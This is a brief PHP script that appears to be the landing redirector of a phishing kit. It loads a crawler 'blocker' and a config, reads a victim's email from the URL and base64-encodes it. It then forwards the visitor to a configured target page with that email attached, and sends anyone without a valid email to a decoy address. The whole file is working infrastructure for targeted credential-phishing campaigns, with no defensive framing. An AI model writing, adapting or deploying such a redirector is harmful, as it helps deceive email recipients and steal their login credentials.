<?php error_reporting(0);
include ('blocker.php');
include ('config.php');
preg_match("/[^\/]+$/", $_SERVER["REQUEST_URI"], $matches);
$data = $matches[0];

if (filter_var($data, FILTER_VALIDATE_EMAIL)) {
    $email = filter_var($data, FILTER_SANITIZE_EMAIL);
    $email = base64_encode($email); //use when you want to convert plain email to base64
    $email = $email; //use when you want to send plain email as it is
    
}elseif(isset($_GET['ok'])){
header("Location: ".$pagelink); 
exit();
}

else {
    
    if ($redirecttype == 1 || $redirecttype == '1') {
        header("Location: " . $FailRedirect);
    } else {
        echo "<script type=\"text/javascript\">window.location.href = \"$FailRedirect\"</script>
";
    }
    die();
}
if ($redirecttype == 1 || $redirecttype == '1') {
    header("Location: " . $pagelink . $email);
} else {
    echo "<script type=\"text/javascript\">window.location.href = \"$pagelink$email\"</script>
";
}
die();


//Base64 to Plain Text